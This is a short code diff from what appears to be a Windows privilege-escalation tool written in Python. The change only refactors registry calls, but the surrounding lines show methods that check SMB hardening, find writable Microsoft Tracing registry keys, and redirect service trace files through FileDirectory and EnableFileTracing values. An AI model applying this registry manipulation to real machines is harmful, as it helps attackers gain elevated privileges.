@@ -46,7 +46,7 @@ class WebClient():
 
 	# check if the system has been hardenned enough to avoid this kind of privilege escalation
 	def isSMBHardened(self):
-		hkey = _winreg.OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters', 0, KEY_READ)
+		hkey = OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters', 0, KEY_READ)
 		
 		smb_signature = 0
 		server_name_hardening = 0
@@ -100,7 +100,7 @@ class WebClient():
 
 	def find_services_trigger(self, service):
 		accessWrite = KEY_WRITE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE
-		hkey = _winreg.OpenKey(HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing', 0, accessWrite)
+		hkey = OpenKey(HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing', 0, accessWrite)
 		num = _winreg.QueryInfoKey(hkey)[0]
 
 		triggers = []
@@ -118,7 +118,7 @@ class WebClient():
 		return triggers
 
 	def modify_registry(self, service_name, fileDirectory='%windir%\\tracing', enableFileTracing=0):
-		skey = _winreg.OpenKey(HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing\\%s' % service_name, 0, KEY_WRITE)
+		skey = OpenKey(HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing\\%s' % service_name, 0, KEY_WRITE)
 		_winreg.SetValueEx(skey, 'FileDirectory', 0, REG_EXPAND_SZ, fileDirectory)
 		_winreg.SetValueEx(skey, 'EnableFileTracing', 0, REG_DWORD, enableFileTracing)
 		_winreg.CloseKey(skey)
